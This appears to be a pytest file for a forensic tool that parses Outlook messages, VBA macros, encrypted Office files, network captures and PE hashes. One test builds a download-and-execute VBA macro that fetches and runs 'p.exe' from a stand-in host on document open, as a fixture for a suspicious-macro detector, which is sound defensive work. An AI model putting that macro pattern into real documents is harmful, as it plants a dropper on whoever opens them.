"""Outlook .msg, Office macros, encrypted Office documents, network
captures and PE import hashes, on published samples (fetched and SHA-256
pinned by tools/fetch_artifact_samples.py).

Expected values come from outside TRACE: Apache POI's own assertions for
its .msg files and its .vba reference source for its macro documents;
msoffcrypto-tool's published decrypted copies; tcpdump's decoded output
for its captures; dpkt's own HTTP and TLS parsers for Zeek's captures;
Mandiant's imphash definition applied to the import list.
"""

import hashlib
import os
import struct

import pytest

from tests.conftest import ROOT

SAMPLES = os.path.join(ROOT, 'test_images', 'artifact_samples')
CARVE = os.path.join(ROOT, 'test_images', 'carve_samples')
OFFICE_PASSWORD = 'Password1234_'          # msoffcrypto-tool's tests


def sample(name, folder=SAMPLES):
    path = os.path.join(folder, name)
    if not os.path.exists(path):
        message = f"{name} is missing -- run tools/fetch_artifact_samples.py"
        if os.environ.get('TRACE_REQUIRE_IMAGES') == '1':
            pytest.fail(message)
        pytest.skip(message)
    with open(path, 'rb') as handle:
        return handle.read()


# --- Outlook .msg ---------------------------------------------------------------

def test_msg_fields_as_apache_poi_reads_them():
    from trace_app.core import msgfile
    quick = msgfile.Message.open(sample('poi-quick.msg'))
    assert quick.subject == 'Test the content transformer'
    assert ('To', 'Kevin Roast <kevin.roast@alfresco.org>') in \
        quick.recipients()
    kind, body, _source = quick.body()
    assert (kind, body) == ('text', 'The quick brown fox jumps over the '
                                    'lazy dog\r\n')
    assert quick.attachments() == []

    pieces = msgfile.Message.open(sample('poi-attachment_test_msg.msg'))
    assert pieces.subject == 'test pi\u00e8ce jointe 1'
    assert any('nicolas1.23456@free.fr' in r for _k, r in
               pieces.recipients())
    assert [(a['name'], len(a['data'])) for a in pieces.attachments()] == \
        [('test-unicode.doc', 24064), ('pj1.txt', 89)]

    # POI: two attachments, one of them a message; Chinese in cp950 with
    # the HTML declaring big5; two Cyrillic recipients.
    assert len(msgfile.Message.open(
        sample('poi-attachment_msg_pdf.msg')).attachments()) == 2
    chinese = msgfile.Message.open(sample('poi-chinese-traditional.msg'))
    assert 'text/html; charset=big5' in chinese.body()[1]
    assert '\u683c\u5f0f\u6e2c\u8a66' in chinese.subject     # 格式測試
    cyrillic = msgfile.Message.open(sample('poi-cyrillic_message.msg'))
    assert len(cyrillic.recipients()) == 2
    assert cyrillic.subject.startswith('\u0410\u0432\u0442\u043e')  # Авто
    utf8 = msgfile.Message.open(sample('poi-HTMLBodyBinary_UTF-8.msg'))
    assert utf8.subject == 'Subject \u00f6\u00e4\u00fc Subject'


def test_a_msg_is_browsed_viewed_and_indexed():
    from trace_app.core import archives, document_preview, filetypes, \
        text_extract
    data = sample('poi-attachment_test_msg.msg')
    assert archives.detect_archive(data) == 'msg'
    names = [m['name'] for m in archives.list_members(data)]
    assert names[0].endswith('.html') and \
        'attachments/test-unicode.doc' in names
    assert len(archives.read_member(data, 'attachments/pj1.txt')) == 89
    page = archives.read_member(data, names[0])
    assert page.startswith(b'<html') and b'pi\xc3\xa8ce jointe' in page
    # Renamed, it is still shown as a message (libmagic says only CDFV2).
    plan = filetypes.plan_view('evidence.bin', data)
    assert (plan.kind, plan.subtype) == ('office', 'msg')
    _html, notices = document_preview.to_html(data, 'msg')
    assert notices[0].startswith('Outlook message (.msg). 2 attachments')
    text = text_extract.extract_text(sample('poi-quick.msg'), 'q.msg')
    assert 'Test the content transformer' in text and 'quick brown fox' in \
        text


def test_an_attached_message_is_its_own_page():
    from trace_app.core import archives
    data = sample('poi-attachment_msg_pdf.msg')
    names = [m['name'] for m in archives.list_members(data)]
    embedded = [n for n in names if n.startswith('attachments/') and
                n.endswith('.html')]
    assert embedded and any(n.endswith('.pdf') for n in names)
    assert archives.read_member(data, embedded[0]).startswith(b'<html')


# --- VBA macros -----------------------------------------------------------------

def _without_attributes(source):
    return '\n'.join(line for line in source.splitlines()
                     if not line.startswith('Attribute ')).strip()


@pytest.mark.parametrize('document, reference, kind', [
    ('poi-document-SimpleMacro.doc', 'poi-document-SimpleMacro.vba', 'legacy'),
    ('poi-document-SimpleMacro.docm', 'poi-document-SimpleMacro.vba',
     'docx'),
    ('poi-spreadsheet-SimpleMacro.xls', 'poi-spreadsheet-SimpleMacro.vba',
     'legacy'),
    ('poi-spreadsheet-SimpleMacro.xlsm', 'poi-spreadsheet-SimpleMacro.vba',
     'xlsx'),
    ('poi-slideshow-SimpleMacro.pptm', 'poi-slideshow-SimpleMacro.vba',
     'pptx'),
])
def test_macro_source_is_what_apache_poi_extracts(document, reference, kind):
    from trace_app.core import content_checks, document_preview, \
        text_extract, vba
    data = sample(document)
    expected = sample(reference).decode('latin-1').replace('\r\n', '\n')
    project = vba.extract(data)
    assert project is not None and not project.problems
    # The source as stored keeps the 'Attribute' lines the editor hides;
    # POI's reference does not.
    assert any(_without_attributes(expected) in
               _without_attributes(m.source) for m in project.modules)
    (finding,) = [f for f in content_checks.inspect(
        document, data, {content_checks.MODULE_HIDDEN})
        if f.kind == 'macro']
    assert finding.grade == content_checks.GRADE_NOTABLE   # nothing runs
    html, notices = document_preview.to_html(data, kind)
    assert notices[0].startswith('VBA macros:') and 'TestMacro' in html
    assert 'TestMacro' in text_extract.extract_text(data, document)


def test_excel_4_macro_sheets_are_reported():
    from trace_app.core import vba
    project = vba.extract(sample('poi-spreadsheet-xlmmacro.xlsm'))
    assert project.excel4 and 'Excel 4.0 macro sheets' in vba.summary(
        project)


def test_what_makes_macros_suspicious():
    from trace_app.core import vba
    project = vba.Project('test')
    project.modules.append(vba.Module('ThisDocument', 'x', (
        'Sub Document_Open()\n'
        '  URLDownloadToFile 0, "http://bad.example/p.exe", '
        'Environ("TEMP") & "\\p.exe", 0, 0\n'
        '  Shell Environ("TEMP") & "\\p.exe"\nEnd Sub\n')))
    found = vba.indicators(project)
    assert found['grade'] == 'suspicious'
    assert found['autoexec'] == ['Document_Open']
    assert 'downloads' in found['signs'] and 'runs programs' in found['signs']
    assert found['urls'] == ['http://bad.example/p.exe']
    # A macro that only formats a cell is not.
    benign = vba.Project('test')
    benign.modules.append(vba.Module('Module1', 'x',
                                     'Sub F()\n  Range("A1").Bold = True\n'
                                     'End Sub\n'))
    assert vba.indicators(benign)['grade'] == 'notable'


# --- encrypted Office documents -------------------------------------------------

@pytest.mark.parametrize('encrypted, plain, password', [
    ('mso-example_password.docx', 'mso-plain-example.docx', OFFICE_PASSWORD),
    ('mso-example_password.xlsx', 'mso-plain-example.xlsx', OFFICE_PASSWORD),
    ('mso-ecma376standard_password.docx',
     'mso-plain-ecma376standard_password_plain.docx', OFFICE_PASSWORD),
    ('mso-rc4cryptoapi_password.doc',
     'mso-plain-rc4cryptoapi_password_plain.doc', OFFICE_PASSWORD),
    ('mso-rc4cryptoapi_password.xls',
     'mso-plain-rc4cryptoapi_password_plain.xls', OFFICE_PASSWORD),
])
def test_encrypted_office_decrypts_to_the_published_plain_copy(
        encrypted, plain, password):
    from trace_app.core import document_preview
    data = sample(encrypted)
    assert document_preview.is_encrypted(data)
    assert not document_preview.is_encrypted(sample(plain))
    assert document_preview.decrypt(data, password) == sample(plain)
    with pytest.raises(document_preview.PreviewError):
        document_preview.decrypt(data, 'not the password')


def _cells(data):
    """{(sheet, row, column): number} of a BIFF8 workbook: RK, MULRK and
    NUMBER cells, read here from the records."""
    import io
    import olefile

    def rk(value):
        if value & 2:
            number = value >> 2
            if number & 0x20000000:
                number -= 0x40000000
            number = float(number)
        else:
            number = struct.unpack('<d', struct.pack(
                '<Q', (value & 0xFFFFFFFC) << 32))[0]
        return number / 100 if value & 1 else number

    with olefile.OleFileIO(io.BytesIO(data)) as ole:
        stream = ole.openstream('Workbook').read()
    cells, sheet, position = {}, -1, 0
    while position + 4 <= len(stream):
        record, length = struct.unpack_from('<HH', stream, position)
        body = stream[position + 4:position + 4 + length]
        position += 4 + length
        if record == 0x0809 and struct.unpack_from('<H', body, 2)[0] == 0x10:
            sheet += 1
        elif record == 0x00BD:
            row, column = struct.unpack_from('<HH', body)
            for i in range((length - 6) // 6):
                cells[(sheet, row, column + i)] = rk(
                    struct.unpack_from('<I', body, 6 + 6 * i)[0])
        elif record == 0x027E:
            row, column, _xf, value = struct.unpack_from('<HHHI', body)
            cells[(sheet, row, column)] = rk(value)
        elif record == 0x0203:
            row, column = struct.unpack_from('<HH', body)
            cells[(sheet, row, column)] = struct.unpack_from('<d', body,
                                                             6)[0]
    return cells


def test_an_xor_obfuscated_workbook_decrypts_to_the_same_cells():
    """The published 'plain' copy was saved again by Excel (its MULRK
    cells became NUMBER records, 11,449 records against 950), so the bytes
    cannot match; every cell's value must. (msoffcrypto-tool's own test
    reads the expected file twice and so compares nothing.)"""
    from trace_app.core import document_preview
    data = sample('mso-xor_password_123456789012345.xls')
    assert document_preview.is_encrypted(data)
    plain = document_preview.decrypt(data, '123456789012345')
    expected = _cells(sample(
        'mso-plain-xor_password_123456789012345_plain.xls'))
    assert len(expected) == 10920
    assert _cells(plain) == expected


def test_the_viewer_unlocks_an_encrypted_document(qapp):
    from trace_app.ui.viewers.media import UnifiedViewer
    viewer = UnifiedViewer()
    try:
        viewer.display_application_content(
            sample('mso-example_password.docx'), 'report.docx')
        assert viewer._locked is not None
        assert viewer.unlock_button.isVisibleTo(viewer)
        assert not viewer.unlock_document('wrong')
        assert viewer._locked is not None            # still locked
        assert viewer.unlock_document(OFFICE_PASSWORD)
        assert viewer._locked is None
        assert not viewer.unlock_button.isVisibleTo(viewer)
        assert 'Decrypted in memory' in viewer.notice.text() or \
            viewer.get_html_viewer().isVisibleTo(viewer)
    finally:
        viewer.deleteLater()


# --- network captures -------------------------------------------------------------

def test_dns_over_udp_and_tcp_as_tcpdump_decodes_it():
    """tcpdump's dns_udp.out: 09:19:54.740079 A? www.tcpdump.org., answered
    A 192.139.46.66, A 198.199.88.104."""
    from trace_app.core import pcap
    for name in ('tcpdump-dns_udp.pcap', 'tcpdump-dns_tcp.pcap'):
        summary = pcap.summarise(sample(name))
        query, answer = [d for d in summary['dns']
                         if d['name'] == 'www.tcpdump.org'][:2]
        assert (query['type'], query['response']) == ('A', False)
        assert answer['answers'] == ['192.139.46.66', '198.199.88.104']
        assert query['client'] == '192.168.1.11' and \
            query['server'] == '209.87.249.18'
    udp = pcap.summarise(sample('tcpdump-dns_udp.pcap'))
    assert udp['dns'][0]['time'] == '2020-06-10 09:19:54.740'
    assert udp['packets'] == 2


def test_http_and_tls_names_match_dpkts_own_parsers():
    import dpkt
    from trace_app.core import pcap
    data = sample('zeek-http-get.pcap')
    summary = pcap.summarise(data)
    (request,) = summary['http']
    expected = []
    for _stamp, frame in dpkt.pcap.Reader(__import__('io').BytesIO(data)):
        payload = bytes(dpkt.ethernet.Ethernet(frame).data.data.data)
        if payload.startswith(b'GET '):
            parsed = dpkt.http.Request(payload)
            expected.append((parsed.method, parsed.headers['host'],
                             parsed.uri, parsed.headers['user-agent']))
    assert [(request['method'], request['host'], request['uri'],
             request['agent'])] == expected
    tls = pcap.summarise(sample('zeek-tls-chrome-34-google.pcap'))['tls']
    assert tls and tls[0]['name'] == 'google.de' and tls[0]['port'] == 443
    # dpkt's TLS ClientHello parser names the same server.
    for _stamp, frame in dpkt.pcap.Reader(__import__('io').BytesIO(
            sample('zeek-tls-chrome-34-google.pcap'))):
        payload = bytes(dpkt.ethernet.Ethernet(frame).data.data.data)
        if payload[:1] == b'\x16' and payload[5:6] == b'\x01':
            record = dpkt.ssl.TLSRecord(payload)
            hello = dpkt.ssl.TLSHandshake(record.data).data
            names = [ext[1] for ext in hello.extensions if ext[0] == 0]
            assert names and names[0][5:].decode() == 'google.de'
            break


def test_pcapng_is_read_packet_for_packet():
    from trace_app.core import pcap
    data = sample('tcpdump-ahcp.pcapng')
    # Count Enhanced (6) and Simple (3) Packet Blocks by walking the file.
    count, position = 0, 0
    order = '<' if data[8:12] == b'\x4d\x3c\x2b\x1a' else '>'
    while position + 8 <= len(data):
        kind, length = struct.unpack_from(order + 'II', data, position)
        if kind in (3, 6):
            count += 1
        position += length
    summary = pcap.summarise(data)
    assert summary['format'] == 'pcapng' and summary['packets'] == count > 0


def test_a_capture_is_viewed_and_indexed_whatever_its_name():
    from trace_app.core import document_preview, filetypes, text_extract
    data = sample('zeek-http-get.pcap')
    plan = filetypes.plan_view('dump.dat', data)
    assert (plan.kind, plan.subtype) == ('office', 'pcap')
    html, notices = document_preview.to_html(data, 'pcap')
    assert '1 HTTP requests' in notices[0]
    assert 'http://bro.org/download/CHANGES.bro-aux.txt' in html
    text = text_extract.extract_text(data, 'dump.dat')
    assert 'bro.org' in text and 'Wget/1.14' in text


# --- PE import and Rich-header hashes -------------------------------------------

def test_imphash_is_mandiants_over_the_import_list():
    from trace_app.core import executables
    data = sample('pageant.exe', CARVE)
    facts = executables.analyse(data)
    pieces = []
    for entry in facts['imports']:
        library = entry['library'].lower().rsplit('.', 1)[0] \
            if entry['library'].lower().endswith(('.dll', '.ocx', '.sys')) \
            else entry['library'].lower()
        for function in entry['functions']:
            pieces.append(f"{library}.{function.lower()}")
    assert facts['imphash'] == hashlib.md5(
        ','.join(pieces).encode()).hexdigest()
    # PuTTY is not linked by Microsoft's linker: no Rich header.
    assert 'rich_hash' not in facts
    # CPython 3.9's wininst stub is (MSVC). The Rich hash: the header
    # decoded (XOR with the key after 'Rich') from 'DanS' up to 'Rich',
    # MD5'd.
    data = sample('cpython-wininst-14.0-amd64.exe')
    facts = executables.analyse(data)
    rich = data.index(b'Rich', 0, 0x400)
    key = data[rich + 4:rich + 8]
    start = next(i for i in range(0x40, rich, 4) if bytes(
        b ^ key[j % 4] for j, b in enumerate(data[i:i + 4])) == b'DanS')
    clear = bytes(b ^ key[i % 4] for i, b in enumerate(data[start:rich]))
    assert facts['rich_hash'] == hashlib.md5(clear).hexdigest()
